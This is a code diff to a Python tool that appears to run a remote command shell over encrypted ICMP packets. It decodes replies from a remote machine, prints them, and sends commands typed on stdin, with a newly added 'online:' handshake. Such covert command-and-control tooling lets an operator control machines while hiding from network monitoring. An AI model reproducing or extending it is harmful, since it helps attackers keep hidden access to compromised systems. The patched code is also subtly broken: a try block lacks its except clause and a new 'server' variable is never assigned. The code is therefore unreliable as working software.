@@ -31,6 +31,10 @@ from Crypto import Random
 
 from config import PASSWORD, SECRET
 
+# todo: protocol
+# 
+MSG_ONLINE = 'online:'
+
 def set_non_blocking(fd):
     """
     Make a file descriptor non-blocking
@@ -77,7 +81,7 @@ def auth_code(uid):
         sha = hashlib.sha256()
         sha.update(digest)
         sha.update(SECRET)
-        return sha.digest()
+        return sha.hexdigest()
 
 
 def main():
@@ -123,7 +127,8 @@ def main():
     # encrypt packet
     encryptor = Crypt(PASSWORD)
 
-    client = None
+    #
+    server = None
 
     while True:
         cmd = ''
@@ -149,18 +154,24 @@ def main():
                 seq_id = icmppacket.get_icmp_seq()
                 data = icmppacket.get_data_as_string()
 
-                if len(data):
+                try:
+                    msg = encryptor.decrypt(data)
+
+                    if not server and msg.startswith(MSG_ONLINE):
+                        uid = msg[len(MSG_ONLINE):]
+                        cmd = auth_code(uid)
+
+                    else:
+                        sys.stdout.write(msg)
+
+                    pass
+
+                if not cmd:
+                    # Parse command from standard input
                     try:
-                        output = encryptor.decrypt(data)
-                        sys.stdout.write(output)
+                        cmd = sys.stdin.readline()
                     except:
                         pass
-
-                # Parse command from standard input
-                try:
-                    cmd = sys.stdin.readline()
-                except:
-                    pass
 
                 if cmd == 'exit\n':
                     return
